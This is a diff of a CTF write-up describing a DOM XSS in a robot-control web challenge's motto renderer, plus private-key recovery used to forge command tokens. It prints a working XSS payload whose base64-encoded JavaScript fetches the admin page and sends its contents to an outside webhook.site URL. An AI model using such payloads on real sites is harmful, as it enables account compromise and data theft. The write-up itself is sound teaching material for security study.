@@ -1,5 +1,9 @@
+`Team` : `srdnlen`
+`Solvers` : `chri, lrnzsir, pysu, sanmatte`
+<br>
 # Overview
 ---
+<div style="text-align: justify;"> 
 
 >This is a cyberwar.
 >Every cyberwar has its robotank.
@@ -13,6 +17,8 @@ On the main page, buttons allow us to execute real-time actions on the robot. A 
 - **Green**: you were the owner and you could execute it.
 
 ![](webinterface_start.png)
+<div style="page-break-after: always;"></div>
+
 # Exploitation
 ---
 ## Web
@@ -26,6 +32,7 @@ On the account page `/account/:id`, users could modify a team's motto, and this 
 ![](account_page.png)
 
 The `bbrender.js` script was responsible for altering a team's motto. By inspecting the code below, we noticed that the content inside the element in the red box on the left side was extracted through the instruction `window.current_motto.innerText`. Subsequent checks and manipulations were performed, and the result was then inserted back into the same element. However, this process presented **two** main issues: the use of the `innerText` property at the end, which does not sanitize user input (would be better to use a safe property like `textContent` or `DOMPurify` library), and the implemented custom syntax, which allows XSS.
+<div style="page-break-after: always;"></div>
 
 ```js
 // bbrender.js
@@ -34,7 +41,8 @@ $(document).ready(() => {
 	if (window.current_motto) {
 		var current_motto = window.current_motto.innerText;
 		
-		//Welcome back to my laboratory, where safety is the number one priority default_account
+		//Welcome back to my laboratory, 
+		//where safety is the number one priority
 		if (current_motto.includes("<") || current_motto.includes(">")) 
 			return; 
 		
@@ -56,7 +64,9 @@ $(document).ready(() => {
 
 The code revealed that the authors disabled the insertion of images due to safety concerns. Nevertheless, exploiting the presence of certain tags, we successfully triggered a **DOM XSS** after some attempts. As our initial action, we dumped the admin page using the following payload:
 ```
-[url \"aa\"onfocus=\"eval(atob('ZmV0Y2goJy9hZG1pbicpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oKGQpPT57ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzcyZTEyMGZhLTQyOTEtNDY1ZC05ZDQ1LWI5Zjg0YzM2YmM5OD9jPScrZW5jb2RlVVJJQ29tcG9uZW50KGQpKX0p'))\"autofocus]XSS[/url]
+[url \"aa\"onfocus=\"eval(atob('ZmV0Y2goJy9hZG1pbicpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oKGQpPT57ZmV0Y
+2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzcyZTEyMGZhLTQyOTEtNDY1ZC05ZDQ1LWI5Zjg0YzM2YmM5OD9jPScrZW5jb2RlVV
+JJQ29tcG9uZW50KGQpKX0p'))\"autofocus]XSS[/url]
 ```
 
 ```js
@@ -89,8 +99,6 @@ Using the initial coupon of 5 credits that was given at the beginning to each te
 ![](poc.png)\
 *NOTE: There is a space between url and \\*
 
-&emsp;
-
 The base64 inside the `atob` function is the code attached below.
 ```js
 fetch(
@@ -120,6 +128,7 @@ if (await verifyToken(challenge, private_key, token)) {
 ```
 
 Where `verifyToken` function performs an ECDSA verify using the `ed25519` curve, therefore to pass the `verifyToken` function we need to sign the challenge with the private key.
+<br>
 ### Recover the private key
 
 Searching for all the occurrences of the private key in the source code one finds, at line 48 of `routes/auth.js` where `/auth/login` is treated, the following:
@@ -412,9 +421,11 @@ if __name__ == '__main__':
 	    print("\nBye!")
 	except Exception as e:
 	    print(e)
-
 ```
+
+<br><br>
 # Summary
+---
 In the end, we put the two exploits together to control the remote robot.
 
 Final Flow:
@@ -426,7 +437,11 @@ Final Flow:
 - Send the command to the remote robot.
 
 We repeated this flow to navigate with the robot in the room and find the two pieces of hidden flags.
+
+<div style="page-break-after: always;"></div>
+
 #### First part of the flag:
 ![](flag_first_part.png)
 #### Second part of the flag:
 ![](flag_second_part.png)
+</div>
